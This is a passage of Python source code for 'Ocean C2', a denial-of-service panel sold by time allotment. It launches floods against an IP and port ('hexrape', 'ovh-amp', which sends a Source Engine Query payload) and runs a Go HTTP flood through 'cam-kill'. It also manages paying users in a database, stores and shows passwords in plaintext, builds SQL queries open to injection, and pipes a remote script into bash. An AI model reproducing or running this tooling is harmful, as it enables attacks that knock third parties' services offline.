               \x1b[38;2;240;240;240m       \x1b[38;2;12;121;246mtime: \x1b[38;2;137;0;255m{timer}s
               \x1b[38;2;240;240;240m       \x1b[38;2;12;121;246mport: \x1b[38;2;137;0;255m{port}
               \x1b[38;2;240;240;240m╚═════════════\x1b[38;2;12;121;246m═════════════╝
        ''')
                    except socket.gaierror:
                        print('/> Socket Error')
                        print("\n")
            except ValueError:
                print('/> Usage: hexrape <ip> <time> <port>')
                print('/> Example: hexrape 1.1.1.1 120 80')
                print("\n")
        elif sinput == "ovh-amp":
            try:
                sinput, host, timer, port = cnc.split(" ")
                con1 = sqlite3.connect("db/users.db")
                cur1 = con1.cursor()
                cur1.execute(f"SELECT * FROM users WHERE Name='{name}'")
                data = cur1.fetchall()
                for row in data:
                    time1 = row[4]
                    atcktime = row[5]
                timeratck = int(timer) - 1
                
                if time1 == 0:
                    print("\033[37m/> You don't have booting time\n")
                    time.sleep(1)
                    main()
                if time1 <= int(timer):
                    print("\033[37m/> You don't have enough booting time\n")
                    time.sleep(1)
                    main()
                if atcktime <= timeratck:
                    print("\033[37m/> You don't have enough attack time\n")
                    time.sleep(1)
                    main()
                else:
                    try:
                        if running >= cons:
                            import time
                            from time import sleep
                            print("\033[37m/> You have reached max concurrents\n")
                            time.sleep(1)
                        else:
                            sinput, host, timer, port = cnc.split(" ")
                            socket.gethostbyname(host)
                            payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
                            Screen.wrapper(atk)
                            # remove time
                            con1 = sqlite3.connect("db/users.db")
                            cur1 = con1.cursor()
                            cur1.execute(f"SELECT * FROM users WHERE Name='{name}'")
                            data = cur1.fetchall()
                            for row in data:
                                time = row[4]
                            timer = int(timer)
                            time = time - timer
                            cur1.execute(f"UPDATE users SET Time = {time} WHERE Name = '{name}'")
                            con1.commit()
                            con = sqlite3.connect("db/users.db")
                            cur = con.cursor()
                            cur.execute(f"SELECT * FROM users WHERE Name='{name}'")
                            data = cur.fetchall()
                            for row in data:
                                rank = row[2]
                                cons = row[3]
                                time = row[4]
                                atcktime = row[5]
                            sys.stdout.write(f"\x1b]2;|   Ocean C2   |   User: {name}   |   Rank: {rank}   |   Cons: {cons}   |   Attack Time: {atcktime}s   |   Online: {ONL}\x07")
                            threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
                            threading.Thread(target=stdsender1, args=(host, port, timer, payload)).start()
                            clear()
                            Spinner()
                            clear()
                            print("")
                            print(f'''
                \x1b[38;2;137;0;255mAttack Sent
               \x1b[38;2;137;0;255m╔═════════════\x1b[38;2;12;121;246m═════════════╗
               \x1b[38;2;137;0;255m       \x1b[38;2;12;121;246mMethod: \x1b[38;2;137;0;255m{sinput}
               \x1b[38;2;137;0;255m       \x1b[38;2;12;121;246mIP: \x1b[38;2;137;0;255m{host}
               \x1b[38;2;137;0;255m       \x1b[38;2;12;121;246mtime: \x1b[38;2;137;0;255m{timer}s
               \x1b[38;2;137;0;255m       \x1b[38;2;12;121;246mport: \x1b[38;2;137;0;255m{port}
               \x1b[38;2;137;0;255m╚═════════════\x1b[38;2;12;121;246m═════════════╝
        ''')
                    except socket.gaierror:
                        print('/> Socket Error')
                        print("\n")
            except ValueError:
                print('/> Usage: ovh-amp <ip> <time> <port>')
                print('/> Example: ovh-amp 1.1.1.1 120 80')
                print("\n")

        elif "cam-kill" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()[3]
                timer = cnc.split()[4]
                Screen.wrapper(atk)
                con1 = sqlite3.connect("db/users.db")
                cur1 = con1.cursor()
                cur1.execute(f"SELECT * FROM users WHERE Name='{name}'")
                data = cur1.fetchall()
                for row in data:
                    time = row[4]
                timer = int(timer)
                time = time - timer
                cur1.execute(f"UPDATE users SET Time = {time} WHERE Name = '{name}'")
                con1.commit()
                con = sqlite3.connect("db/users.db")
                cur = con.cursor()
                cur.execute(f"SELECT * FROM users WHERE Name='{name}'")
                data = cur.fetchall()
                for row in data:
                    rank = row[2]
                    cons = row[3]
                    time = row[4]
                    atcktime = row[5]
                sys.stdout.write(f"\x1b]2;|   Ocean C2   |   User: {name}   |   Rank: {rank}   |   Cons: {cons}   |   Attack Time: {atcktime}s   |   Online: {ONL}\x07")
                os.system(f'go run methods/camkill.go {url} {thread} {method} {timer} nil')
            except IndexError:
                print('/> Usage: cam-kill <url> <threads> METHODS<GET/POST> <time>')
                print('/> Example: cam-kill http://example.com 15000 get 60')
                print("\n")
        elif sinput == "stop" or sinput == "stopattacks":
            attack = False
            while not attack:
                if aid == 0:
                    attack = True
            print("/> All attacks are stopped\n")
        # Banners
        elif "girl" in cnc:
            clear()
            Screen.wrapper(atk)
            main()
        elif "parrot" in cnc:
                os.system('curl parrot.live')
        elif "surprise" in cnc:
                os.system('curl -L https://raw.githubusercontent.com/keroserene/rickrollrc/master/roll.sh | bash')
        # Tools
        elif "ip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f"https://ipapi.co/{ip}/json/")
                    geoiplook(ip)
                except:
                    print("/> Unknown IP \n")
            except IndexError:
                print('/> Usage: geoip <ip>')
                print('/> Example: geoip 1.1.1.1')
                
        elif "addusr" in cnc:
            con = sqlite3.connect("db/users.db")
            cur = con.cursor()
            cur.execute(f"SELECT * FROM users WHERE Name='{name}'")
            data = cur.fetchall()
            for row in data:
                rank = row[2]
            if rank == "Owner":
                from time import sleep
                print("")
                name1 = input("\033[37m/> Name: \033[90m")
                pass1 = input("\033[37m/> Password: \033[90m")
                Rank1 = input("\033[37m/> Rank: \033[90m")
                Cons1 = input("\033[37m/> Cons: \033[90m")
                Time1 = input("\033[37m/> Booting time: \033[90m")
                AtkTime1 = input("\033[37m/> Attack Time: \033[90m")
                ban = 0
                con1 = sqlite3.connect("db/users.db")
                cur1 = con1.cursor()
                cur1.execute(f"INSERT INTO users VALUES ('{name1}', '{pass1}', '{Rank1}', '{Cons1}', '{Time1}', '{AtkTime1}', '{ban}')")
                con1.commit()
                con1.close()
                print("\033[37m\n/> User added\n")
            else:
                print("/> You don't have permission for this\n")
        elif "banusr" in cnc:
            con = sqlite3.connect("db/users.db")
            cur = con.cursor()
            cur.execute(f"SELECT * FROM users WHERE Name='{name}'")
            data = cur.fetchall()
            for row in data:
                rank = row[2]
            if rank == "Owner":
                from time import sleep
                print("")
                name1 = input("\033[37m/> Name: \033[90m")
                con1 = sqlite3.connect("db/users.db")
                cur1 = con1.cursor()
                cur1.execute(f"UPDATE users SET Ban = 1 WHERE Name = '{name1}'")
                con1.commit()
                con1.close()
                print("\033[37m\n/> User banned\n")
            else:
                print("/> You don't have permission for this\n")

        elif "unban" in cnc:
            con = sqlite3.connect("db/users.db")
            cur = con.cursor()
            cur.execute(f"SELECT * FROM users WHERE Name='{name}'")
            data = cur.fetchall()
            for row in data:
                rank = row[2]
            if rank == "Owner":
                from time import sleep
                print("")
                name1 = input("\033[37m/> Name: \033[90m")
                con1 = sqlite3.connect("db/users.db")
                cur1 = con1.cursor()
                cur1.execute(f"UPDATE users SET Ban = 0 WHERE Name = '{name1}'")
                con1.commit()
                con1.close()
                print("\033[37m\n/> User unbanned\n")
            else:
                print("/> You don't have permission for this\n")
        elif "delusr" in cnc:
            con = sqlite3.connect("db/users.db")
            cur = con.cursor()
            cur.execute(f"SELECT * FROM users WHERE Name='{name}'")
            data = cur.fetchall()
            for row in data:
                rank = row[2]
            if rank == "Owner":
                from time import sleep
                print("")
                name1 = input("\033[37m/> Name: \033[90m")

                con1 = sqlite3.connect("db/users.db")
                cur1 = con1.cursor()
                cur1.execute(f"DELETE FROM users WHERE Name='{name1}'")
                con1.commit()
                con1.close()
                print("\033[37m\n/> User deleted\n")
            else:
                print("/> You don't have permission for this\n")
        elif "usrlist" in cnc:
            con = sqlite3.connect("db/users.db")
            cur = con.cursor()
            cur.execute(f"SELECT * FROM users WHERE Name='{name}'")
            data = cur.fetchall()
            for row in data:
                rank = row[2]
            if rank == "Owner":
                clear()
                con1 = sqlite3.connect("db/users.db")
                cur1 = con1.cursor()
                cur1.execute(f"SELECT * FROM users")
                # print(cur1.fetchall())
                data = cur1.fetchall()
                print("")
                print(f'''
                \x1b[38;2;137;0;255mUser List
               \x1b[38;2;137;0;255m╔═══════════════════════════════════════\x1b[38;2;12;121;246m═══════════════════════════════════════╗\n''')
                for row in data:
                    name1 = row[0]
                    pass1 = row[1]
                    rank1 = row[2]
                    con1 = row[3]
                    time1 = row[4]
                    atktime1 = row[5]
                    print(f"               \x1b[38;2;12;121;246mName: \x1b[38;2;137;0;255m{name1}\x1b[38;2;50;50;50m | \x1b[38;2;12;121;246mPassword: \x1b[38;2;137;0;255m{pass1}\x1b[38;2;50;50;50m | \x1b[38;2;12;121;246mRank: \x1b[38;2;137;0;255m{rank1}\x1b[38;2;50;50;50m | \x1b[38;2;12;121;246mCons: \x1b[38;2;137;0;255m{con1}\x1b[38;2;50;50;50m | \x1b[38;2;12;121;246mTime: \x1b[38;2;137;0;255m{time1}\x1b[38;2;50;50;50m | \x1b[38;2;12;121;246mAttack: \x1b[38;2;137;0;255m{atktime1}")
                print(f'''
               \x1b[38;2;137;0;255m╚═══════════════════════════════════════\x1b[38;2;12;121;246m═══════════════════════════════════════╝
        ''')
            else:
                print("/> You don't have permission for this\n")

        elif cnc == "exit":
            sys.exit
            break
        else:
            try:
                cmmnd = cnc.split()[0]
                print(f"/> Command: [ \033[90m{cmmnd}\033[37m ] Not Found\n")
            except IndexError:
                pass


# Gifs
def atk(screen):
    from asciimatics.effects import BannerText, Print, Scroll
    from asciimatics.renderers import ColourImageFile, FigletText, ImageFile, StaticRenderer
    from asciimatics.scene import Scene
    from asciimatics.screen import Screen
    from asciimatics.exceptions import ResizeScreenError, StopApplication
    rannum = str(randint(1, 5))
    scenes = []
    effects = [
        Print(screen,
              ColourImageFile(screen, f"gifs/other/atk.gif", screen.height,
                              uni=screen._uni_line_chars, dither=screen.unicode_aware),
              screen.height//- 100,
              speed=1),
    ]
    scenes.append(Scene(effects, 41))

    screen.play(scenes, stop_on_resize=False, repeat=False)

def logi(screen):
    from asciimatics.effects import BannerText, Print, Scroll
    from asciimatics.renderers import ColourImageFile, FigletText, ImageFile, StaticRenderer
    from asciimatics.scene import Scene
    from asciimatics.screen import Screen
    from asciimatics.exceptions import ResizeScreenError, StopApplication
    scenes = []
    effects = [
        Print(screen,
              ColourImageFile(screen, f"gifs/other/anime.gif", screen.height,
                              uni=screen._uni_line_chars, dither=screen.unicode_aware),
              screen.height//- 100,
              speed=1),
    ]
    scenes.append(Scene(effects, 21))

    screen.play(scenes, stop_on_resize=False, repeat=False)



def login(name,password):
    import time
    from time import sleep
    con = sqlite3.connect("db/users.db")
    cur = con.cursor()
    statement = f"SELECT name from users WHERE Name='{name}' AND Password = '{password}';"
    cur.execute(statement)
    if not cur.fetchone():
        print("\n/> Wrong name or password")
        time.sleep(2)
        sys.exit
    else:
        con = sqlite3.connect("db/users.db")
        cur = con.cursor()
        cur.execute(f"SELECT * FROM users WHERE Name='{name}'")
        data = cur.fetchall()
        for row in data:
            ban = row[6]
        if ban == 1:
            print("\n/> You are banned!")
            time.sleep(2)
            sys.exit
        else:
            print("\n/> Login Successful")
            clear()
            Screen.wrapper(logi)
            main()

def access():
    os.system('cls' if os.name == 'nt' else 'clear')
    sys.stdout.write(f"\x1b]2;|   Ocean    |   Login    \x07")
    global name
    print("")
    print("\x1b[38;2;137;0;255m - <> Ocean C2 <> - ")
    print("")
    name = input("\x1b[38;2;137;0;255m/> Username: ")
    password = getpass.getpass(prompt="\x1b[38;2;137;0;255m/> Password: ")
    login(name,password)


try:
    if test == 1:
        name = "Test"
        main()
    if test == 0:
        clear()
        access()

except KeyboardInterrupt:
    print("\n/> Keyboard Interrupt")
    time.sleep(1)
    main()